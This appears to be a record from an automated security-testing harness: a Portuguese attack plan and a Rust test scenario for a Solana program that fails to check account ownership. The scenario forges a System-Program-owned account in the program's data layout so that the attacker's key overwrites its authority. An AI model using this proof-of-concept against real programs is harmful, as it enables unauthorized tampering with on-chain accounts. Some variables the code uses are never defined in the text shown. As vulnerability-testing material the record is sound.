attempts.raw:
{
  "plan": "O programa `initialize` (native) recebe duas contas: `user_info` (gravavel) e `authority_info`. Ele desserializa `user_info` como `User` (32 bytes = authority) e sobrescreve a authority com a chave de `authority_info`, sem verificar o owner de `user_info`. O baseline usa uma conta `user_info` cujo owner e o proprio programa (legitimo). O ataque fornece uma conta `user_info` cujo owner e outro programa (ex.: System Program) com dados forjados no layout de `User`; se o programa aceitar e gravar, a conta de outro dono foi manipulada. O efeito mede que a authority gravada na conta forjada e igual a chave do atacante e que o owner da conta permanece diferente do program_id.",
  "scenario": "let program_id = env.program_id;

// Conta legitima: owner = program_id, dados iniciais de User (authority qualquer)
let legit_authority = Pubkey::new_unique();
let legit_user_data = anchor_account_data("User", &(legit_authority,));
let legit_user = account(&program_id, &legit_user_data, None);

// Conta forjada: owner = System Program (diferente do programa), dados no layout de User
let forged_authority = Pubkey::new_unique();
let forged_user_data = anchor_account_data("User", &(forged_authority,));
let forged_user = account(&solana_program::system_program::id(), &forged_user_data, None);

// Authority que o atacante controla
let attacker_authority = Pubkey::new_unique();
let authority_account = wallet(1_000_000_000);

// Instrucao Init {} (Borsh: enum unit -> 1 byte 0)
let ix_data = vec![0u8];

// Baseline: user_info com owner correto
let baseline_ix = env.raw_ix(
    &ix_data,
    &[
        AccountMeta::new(legit_user_key, false),
        AccountMeta::new_readonly(attacker_authority, false),
    ],
);
let baseline_accounts = vec![
    (legit_user_key, legit_user.clone()),
    (attacker_authority, authority_account.clone()),
];
let baseline_result = env.baseline(
    "initialize legitimo com conta do programa",
    &baseline_ix,
    &baseline_accounts,
);

// Ataque: user_info com owner diferente (System Program)
let attack_ix = env.raw_ix(
    &ix_data,
    &[
        AccountMeta::new(forged_user_key, false),
        AccountMeta::new_readonly(attacker_authority, false),
    ],
);
let attack_accounts = vec![
    (forged_user_key, forged_user.clone()),
    (attacker_authority, authority_account.clone()),
];
let attack_result = env.attack(
    "initialize com conta forjada de outro owner",
    &attack_ix,
    &attack_accounts,
);

if attack_result.program_result == ProgramResult::Success {
    let forged_after = after(&attack_result, &forged_user_key);
    let written_authority = read_pubkey(forged_after.data(), 0);
    env.effect(
        "conta de outro owner foi sobrescrita com a authority do atacante",
        written_authority == attacker_authority && forged_after.owner() != &program_id,
    );
}"
}

